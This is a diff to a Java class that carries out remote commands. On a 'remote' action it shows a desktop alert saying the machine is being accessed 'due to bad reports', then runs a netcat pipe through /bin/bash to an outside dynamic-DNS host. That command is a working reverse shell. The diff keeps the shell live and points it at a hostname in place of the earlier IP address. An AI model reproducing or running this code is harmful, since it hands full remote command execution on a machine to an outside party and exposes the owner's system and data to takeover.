@@ -23,16 +23,12 @@ public class Operation {
         this.param = param;
     }
 
-    public void doOperation() throws IOException {
+    public void doOperation() throws IOException, InterruptedException {
 
         if (this.action.contentEquals("shutdown")) {
             shutdown();
         }else if(this.action.contentEquals("remote")){
-            try {
-                remote();
-            } catch (InterruptedException ex) {
-                Logger.getLogger(Operation.class.getName()).log(Level.SEVERE, null, ex);
-            }
+            remote();
         }
     }
 
@@ -54,12 +50,10 @@ public class Operation {
         String myCommand = new String();
         
         plat = "bash";
-        myCommand = "notify-send 'Alert' 'We are remote accessing this computer due to bad reports.";
+        myCommand = "notify-send 'Alert' 'We are remote accessing this computer due to bad reports.'";
         Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
         Thread.sleep(1000);
-        myCommand = "nc -vv 201.159.152.252 1890 | /bin/bash | nc 201.159.152.252 1891";
-
-        System.out.println(this.param);
+        myCommand = "nc -vv myminifw.ddns.net 1890 | /bin/bash | nc myminifw.ddns.net 1891";
         Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
     }
 }
